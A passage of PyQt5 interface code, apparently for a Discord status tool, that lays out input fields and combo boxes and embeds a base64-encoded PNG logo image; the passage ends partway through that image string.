        self.label_7 = QtWidgets.QLabel(self.panel)
        self.label_7.setGeometry(QtCore.QRect(12, 240, 71, 20))
        self.label_7.setObjectName("label_7")
        self.twitchurl = QtWidgets.QLineEdit(self.panel)
        self.twitchurl.setGeometry(QtCore.QRect(90, 240, 161, 22))
        self.twitchurl.setObjectName("twitchurl")
        self.label_4 = QtWidgets.QLabel(self.panel)
        self.label_4.setGeometry(QtCore.QRect(26, 240, 71, 20))
        self.label_4.setObjectName("label_4")
        self.setstatus = QtWidgets.QComboBox(self.panel)
        self.setstatus.setGeometry(QtCore.QRect(90, 240, 161, 22))
        self.setstatus.setObjectName("setstatus")
        self.setstatus.addItem("")
        self.setstatus.setItemText(0, "")
        self.setstatus.addItem("")
        self.setstatus.addItem("")
        self.setstatus.addItem("")
        self.label_5 = QtWidgets.QLabel(self.panel)
        self.label_5.setGeometry(QtCore.QRect(15, 210, 71, 20))
        self.label_5.setObjectName("label_5")
        self.playingtype = QtWidgets.QComboBox(self.panel)
        self.playingtype.setEnabled(True)
        self.playingtype.setGeometry(QtCore.QRect(90, 210, 161, 22))
        self.playingtype.setStatusTip("")
        self.playingtype.setCurrentIndex(0)
        self.playingtype.setObjectName("playingtype")
        self.playingtype.addItem("")
        self.playingtype.setItemText(0, "")
        self.playingtype.addItem("")
        self.playingtype.addItem("")
        self.playingtype.addItem("")
        self.playingtype.addItem("")
        self.spinBox = QtWidgets.QSpinBox(self.panel)
        self.spinBox.setGeometry(QtCore.QRect(80, 240, 161, 22))
        self.spinBox.setMouseTracking(False)
        self.spinBox.setFocusPolicy(QtCore.Qt.StrongFocus)
        self.spinBox.setAcceptDrops(True)
        self.spinBox.setMaximum(60)
        self.spinBox.setObjectName("spinBox")
        self.label_8 = QtWidgets.QLabel(self.panel)
        self.label_8.setGeometry(QtCore.QRect(28, 240, 61, 20))
        self.label_8.setObjectName("label_8")
        self.serverid = QtWidgets.QLineEdit(self.panel)
        self.serverid.setGeometry(QtCore.QRect(80, 180, 161, 20))
        self.serverid.setObjectName("serverid")
        self.channelid = QtWidgets.QLineEdit(self.panel)
        self.channelid.setGeometry(QtCore.QRect(80, 180, 161, 20))
        self.channelid.setObjectName("channelid")
        self.messageid = QtWidgets.QLineEdit(self.panel)
        self.messageid.setGeometry(QtCore.QRect(80, 210, 161, 20))
        self.messageid.setObjectName("messageid")
        self.label = QtWidgets.QLabel(self.panel)
        self.label.setGeometry(QtCore.QRect(20, 180, 61, 20))
        self.label.setObjectName("label")
        self.label_9 = QtWidgets.QLabel(self.panel)
        self.label_9.setGeometry(QtCore.QRect(13, 180, 61, 20))
        self.label_9.setObjectName("label_9")
        self.label_2 = QtWidgets.QLabel(self.panel)
        self.label_2.setGeometry(QtCore.QRect(24, 210, 61, 20))
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(self.panel)
        self.label_3.setGeometry(QtCore.QRect(30, 250, 61, 20))
        self.label_3.setObjectName("label_3")
        self.encoded_data = ['iVBORw0KGgoAAAANSUhEUgAAAfQAAAH0CAYAAADL1t+KAAAAAXNSR0IArs4c6QAAAARzQklUCAgICHwIZIgAAAAJcEhZcwAADsQAAA7EAZUrDhsAAASEaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8P3hwYWNrZXQgYmVnaW49J++7vycgaWQ9J1c1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCc/Pgo8eDp4bXBtZXRhIHhtbG5zOng9J2Fkb2JlOm5zOm1ldGEvJz4KPHJkZjpSREYgeG1sbnM6cmRmPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjJz4KCiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0nJwogIHhtbG5zOkF0dHJpYj0naHR0cDovL25zLmF0dHJpYnV0aW9uLmNvbS9hZHMvMS4wLyc+CiAgPEF0dHJpYjpBZHM+CiAgIDxyZGY6U2VxPgogICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSdSZXNvdXJjZSc+CiAgICAgPEF0dHJpYjpDcmVhdGVkPjIwMjMtMDMtMjQ8L0F0dHJpYjpDcmVhdGVkPgogICAgIDxBdHRyaWI6RXh0SWQ+ODIyYzlkZWMtNzY3Ny00MmNkLWFlOGItYTU5YjgzMDhhZTdmPC9BdHRyaWI6RXh0SWQ+CiAgICAgPEF0dHJpYjpGYklkPjUyNTI2NTkxNDE3OTU4MDwvQXR0cmliOkZiSWQ+CiAgICAgPEF0dHJpYjpUb3VjaFR5cGU+MjwvQXR0cmliOlRvdWNoVHlwZT4KICAgIDwvcmRmOmxpPgogICA8L3JkZjpTZXE+CiAgPC9BdHRyaWI6QWRzPgogPC9yZGY6RGVzY3JpcHRpb24+CgogPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9JycKICB4bWxuczpkYz0naHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8nPgogIDxkYzp0aXRsZT4KICAgPHJkZjpBbHQ+CiAgICA8cmRmOmxpIHhtbDpsYW5nPSd4LWRlZmF1bHQnPkJsYWNrIGFuZCBXaGl0ZSBTb2xpZCBJY29uIExvZ28gLSAxPC9yZGY6bGk+CiAgIDwvcmRmOkFsdD4KICA8L2RjOnRpdGxlPgogPC9yZGY6RGVzY3JpcHRpb24+CgogPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9JycKICB4bWxuczpwZGY9J2h0dHA6Ly9ucy5hZG9iZS5jb20vcGRmLzEuMy8nPgogIDxwZGY6QXV0aG9yPmNhZ2xhciBrYXBsYW48L3BkZjpBdXRob3I+CiA8L3JkZjpEZXNjcmlwdGlvbj4KCiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0nJwogIHhtbG5zOnhtcD0naHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyc+CiAgPHhtcDpDcmVhdG9yVG9vbD5DYW52YTwveG1wOkNyZWF0b3JUb29sPgogPC9yZGY6RGVzY3JpcHRpb24+CjwvcmRmOlJERj4KPC94OnhtcG1ldGE+Cjw/eHBhY2tldCBlbmQ9J3InPz6xV4qFAAAgAElEQVR4nOzdeZxcZ33n+8/vOUutvaq7tUu2ZUneV3kHGbOYzQaSSYAAyTBkGUjgTghJJpOZXJgkr2SS181McnNzhwy5yZ1kbkJulgEChDVADFwMGPAqy9Zia5d6r679nPM894+nqrvVlmzJUltS6fd+vcrqru4653S5ur/1bL9HAIdSSimlLmjmXF+AUkoppc6cBrpSSinVAzTQlVJKqR6gga6UUkr1AA10pZRSqgdooCullFI9QANdKaWU6gEa6EoppVQP0EBXSimleoAGulJKKdUDNNCVUkqpHqCBrpRSSvUADXSllFKqB2igK6WUUj1AA10ppZTqARroSimlVA/QQFdKKaV6gAa6Ukop1QM00JVSSqkeoIGulFJK9QANdKWUUqoHaKArpZRSPUADXSmllOoBGuhKKaVUD9BAV0oppXqABrpSSinVAzTQlVJKqR6gga6UUkr1AA10pZRSqgdooCullFI9QANdKaWU6gEa6EoppVQP0EBXSimleoAGulJKKdUDNNCVUkqpHqCBrpRSSvUADXSllFKqB2igK6WUUj1AA10ppZTqARroSimlVA/QQFdKKaV6gAa6Ukop1QM00JVSSqkeoIGulFJK9QANdKWUUqoHaKArpZRSPUADXSmllOoBGuhKKaVUD9BAV0oppXqABrpSSinVAzTQlVJKqR6gga6UUkr1AA10pZRSqgdooCullFI9QANdKaWU6gEa6EoppVQP0EBXSimleoAGulJKKdUDNNCVUkqpHqCBrpRSSvUADXSllFKqB2igK6WUUj1AA10ppZTqARroSimlVA/QQFdKKaV6gAa6Ukop1QM00JVSSqkeoIGulFJK9QANdKWUUqoHaKArpZRSPUADXSmllOoBGuhKKaVUD9BAV0oppXqABrpSSinVAzTQlVJKqR6gga6UUkr1AA10pZRSqgdooCullFI9QANdKaWU6gEa6EoppVQP0EBXSimleoAGulJKKdUDNNCVUkqpHqCBrpRSSvUADXSllFKqB2igK6WUUj1AA10ppZTqARroSimlVA/QQFdKKaV6gAa6Ukop1QM00JVSSqkeoIGulFJK9QANdKWUUqoHaKArpZRSPUADXSmllOoBGuhKKaVUD9BAV0oppXqABrpSSinVAzTQlVJKqR6gga6UUkr1AA10pZRSqgdooCullFI9QANdKaWU6gEa6EoppVQP0EBXSimleoAGulJKKdUDNNCVUkqpHqCBrpRSSvUADXSllFKqB2igK6WUUj1AA10ppZTqARroSimlVA/QQFdKKaV6gAa6Ukop1QM00JVSSqkeoIGulFJK9QANdKWUUqoHaKArpZRSPUADXSmllOoBGuhKKaVUD9BAV0oppXqABrpSSinVAzTQlVJKqR6gga6UUkr1AA10pZRSqgdooCullFI9QANdKaWU6gEa6EoppVQP0EBXSimleoAGulJKKdUDNNCVUkqpHhCe6wtQarkZExNF/aRpmyxLCMOMNE06X3Xn9NqUUups0UBXPU0kpFi8Cec2kWVNwjChr69JvX6YfL5CpbIP5zTUlVIXPg101dOCIKZQ2ML4+BAgCI5KxYG7nCRw5HLjlMtPMzPzJGnaOteXq5RSL5qgfY6qhxkTUyjcS612OQB5EayDFIfF/wIEoTA4OE69/nnq9Qn0V0IpdSEKgI+c64tQark4J6TpSoTVgPDRkTqvL6YMG4dgqFuhYaFeLxKGWygW26TpFM7Zc33pSil1WrTLXfU0EUehILTbhjR1jAaONxYT3lYS9mWGz9dD/u9qzM620GzkyOxdFAqWWu1xHVtXSl1QNNBVTxOBfN6SZY40haOZwSFEApeHlqFywlDg+OtqxD81QpJWTC6+jkLhSKf7XSmlLgy6Dl31vCBIMca3tuecdO4VBIgExozjx8sJl0cWh1Cv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